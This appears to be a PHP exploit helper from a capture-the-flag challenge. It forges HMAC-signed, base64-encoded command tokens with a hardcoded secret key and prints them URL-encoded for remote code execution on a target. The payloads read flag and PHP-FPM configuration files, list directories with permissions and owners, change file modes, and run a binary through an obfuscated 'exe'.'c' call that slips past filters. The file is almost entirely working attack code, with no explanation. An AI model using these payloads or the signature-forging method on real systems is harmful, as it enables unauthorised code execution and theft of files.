<?php
function make_command($cmd) {
    $hmac = hash_hmac('sha256', $cmd, 'KHomg4WfVeJNj9q5HFcWr5kjawiejfghojiojw6pQQyzmIZuRBbwDU7UE6jYjPm3');
    return sprintf('%s.%s', base64_encode($cmd), $hmac);
}
echo urlencode(make_command('phpinfo();'))."\n";
//echo urlencode(make_command('echo file_get_contents("/flag3/meow.c");'))."\n";
//echo urlencode(make_command('print_r(scandir("/home"));'))."\n";
echo urlencode(make_command('chmod("flag3/flag3", 0755);function dirToArray($dir,$pre) {$result = array();$cdir = scandir($dir);foreach ($cdir as $key => $value){if (!in_array($value,array(".",".."))){if (is_dir($dir . DIRECTORY_SEPARATOR . $value)){ $result[$value] = dirToArray($dir . DIRECTORY_SEPARATOR . $value);}else{$result[] = $value." _".@decoct(@fileperms($dir."/".$value) & 0777)." _".@fileowner($dir."/".$value);}}}return $result;} print_r(dirToArray("."));'))."\n";
echo urlencode(make_command('$comd="exe"."c";echo $comd("flag3/meow flag3/flag3");'));
//echo urlencode(make_command('function dirToArray($dir) {$result = array();$cdir = scandir($dir);foreach ($cdir as $key => $value){if (!in_array($value,array(".",".."))){if (is_dir($dir . DIRECTORY_SEPARATOR . $value)){ $result[$value] = dirToArray($dir . DIRECTORY_SEPARATOR . $value);}else{$result[] = $value;}}}return $result;} print_r(dirToArray("/etc/php/7.0/fpm"));'))."\n";
//echo urlencode(make_command('echo file_get_contents("/etc/php/7.0/fpm/php-fpm.conf");'))."\n";
//echo urlencode(make_command('echo file_get_contents("flag3/flag3");'))."\n";
//echo hash_equals(hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]), hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]))."\n";
	
?>


 
